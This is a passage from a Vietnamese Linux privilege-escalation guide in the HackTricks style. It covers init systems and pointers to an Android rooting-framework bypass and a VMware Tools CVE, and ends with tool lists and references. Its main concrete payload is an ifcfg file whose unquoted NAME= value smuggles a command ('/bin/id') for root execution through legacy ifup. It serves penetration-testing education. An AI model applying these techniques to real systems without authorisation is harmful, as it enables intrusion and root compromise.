Trên hệ thống thực sự dùng các legacy script có đặc quyền, một phép gán `ifcfg-*` không được đặt trong dấu nháy và được nạp như shell, chẳng hạn `NAME=`, có thể vượt qua ranh giới thực thi mã. Hãy xác minh parser, giá trị và đường kích hoạt chính xác; đừng suy luận rằng shell sẽ diễn giải tệp chỉ dựa vào tên tệp hoặc sự hiện diện của NetworkManager. Một wrapper được sudo cho phép, ghi dữ liệu đầu vào của người gọi vào tệp `ifcfg-*` rồi gọi legacy `ifup`, là một con đường riêng dẫn đến ranh giới này ngay cả khi người gọi không thể trực tiếp chỉnh sửa tệp.

Ví dụ: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Lưu ý khoảng trắng giữa Network và /bin/id_)

### **init, init.d, systemd và rc.d**

Thư mục `/etc/init.d` chứa các **script** dành cho System V init (SysVinit), **hệ thống quản lý dịch vụ Linux cổ điển**. Thư mục này bao gồm các script để `start`, `stop`, `restart` và đôi khi `reload` dịch vụ. Có thể chạy trực tiếp các script này hoặc thông qua các liên kết tượng trưng trong `/etc/rc?.d/`. Một đường dẫn thay thế trên các hệ thống Redhat là `/etc/rc.d/init.d`.

Mặt khác, `/etc/init` liên quan đến **Upstart**, một hệ thống **quản lý dịch vụ** mới hơn do Ubuntu giới thiệu, sử dụng các tệp cấu hình để quản lý dịch vụ. Mặc dù đã chuyển sang Upstart, các script SysVinit vẫn được dùng song song với cấu hình Upstart nhờ lớp tương thích trong Upstart.

**systemd** là một trình quản lý dịch vụ và khởi tạo hiện đại, cung cấp các tính năng nâng cao như khởi chạy daemon theo yêu cầu, quản lý automount và tạo snapshot trạng thái hệ thống. Công cụ này sắp xếp các tệp trong `/usr/lib/systemd/` dành cho các gói phân phối và `/etc/systemd/system/` dành cho các thay đổi của quản trị viên, giúp đơn giản hóa quy trình quản trị hệ thống.<sup>[[21]](#references)</sup>

## Các mẹo khác

### Leo thang đặc quyền NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Thoát khỏi Shell bị giới hạn


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Framework rooting Android: lạm dụng kênh manager

Các framework rooting Android thường hook một syscall để cung cấp chức năng kernel đặc quyền cho một manager ở userspace. Cơ chế xác thực manager yếu (ví dụ: kiểm tra chữ ký dựa trên thứ tự FD hoặc dùng mật khẩu kém) có thể cho phép một app cục bộ giả mạo manager và leo thang lên root trên các thiết bị đã được root. Tìm hiểu thêm và xem chi tiết khai thác tại đây:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## LPE qua phát hiện dịch vụ VMware Tools bằng regex-based exec (CWE-426) (CVE-2025-41244)

Tính năng phát hiện dịch vụ dựa trên regex trong VMware Tools/Aria Operations có thể trích xuất đường dẫn binary từ dòng lệnh tiến trình và thực thi binary đó với tham số -v trong ngữ cảnh có đặc quyền. Các pattern quá dễ dãi (ví dụ: dùng \S) có thể khớp với listener do kẻ tấn công đặt sẵn ở vị trí có thể ghi (ví dụ: /tmp/httpd), dẫn đến thực thi với quyền root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Tìm hiểu thêm và xem một pattern tổng quát có thể áp dụng cho các stack phát hiện/giám sát khác tại đây:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Các biện pháp bảo vệ Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Trợ giúp thêm

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Công cụ Privesc Linux/Unix

### **Công cụ tốt nhất để tìm các vector leo thang đặc quyền cục bộ trên Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(tùy chọn -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Liệt kê các lỗ hổng kernel trên Linux và MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (truy cập vật lý):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Tổng hợp thêm các script**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)



## References

- [1] [0xdf – HTB Planning (leo thang đặc quyền qua Crontab UI, dùng lại thông tin đăng nhập zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: payload .text_sig giả mạo cho monitor chạy bằng cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: vượt qua Neighborhood Watch (chiếm quyền PATH qua sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Leo thang đặc quyền Linux cơ bản](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Hướng dẫn leo thang đặc quyền Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Tấn công và phòng thủ: Các kỹ thuật leo thang đặc quyền Linux năm 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Không ai ngờ đến việc thực thi lệnh!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Leo thang đặc quyền Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Hướng dẫn bài tập thực hành - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Mẹo và thủ thuật leo thang đặc quyền Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Công cụ liệt kê thông tin và leo thang đặc quyền Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket là gì?](https://www.linux.com/news/what-socket/)
- [15] [Bài viết hướng dẫn Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Tìm hiểu về D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Leo thang đặc quyền Linux qua tệp thực thi SUID](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Phần 2 – Leo thang đặc quyền Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Cách quản lý ACL trên Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Root Redhat/CentOS thông qua network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd là gì?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (chèn arithmetic vào Bash qua log, toàn bộ chuỗi khai thác)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Sổ tay GNU Bash – BASH_ENV (tệp khởi động không tương tác)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + leo thang đặc quyền qua symlink TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (cron sao chép pg_basebackup → Bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Bạn đặt tên gì, VMware nâng quyền tên đó (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Leo thang đặc quyền qua Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Các lỗ hổng leo thang đặc quyền Sudo CVE-2025-32462 và CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Thư mục kho lưu trữ PYC](https://peps.python.org/pep-3147/)
- [32] [Tài liệu Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet của @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Ghi lại mật khẩu trên Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Chi tiết về race condition của Logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Tài liệu Python 3.10 – `site` và các tệp cấu hình đường dẫn](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
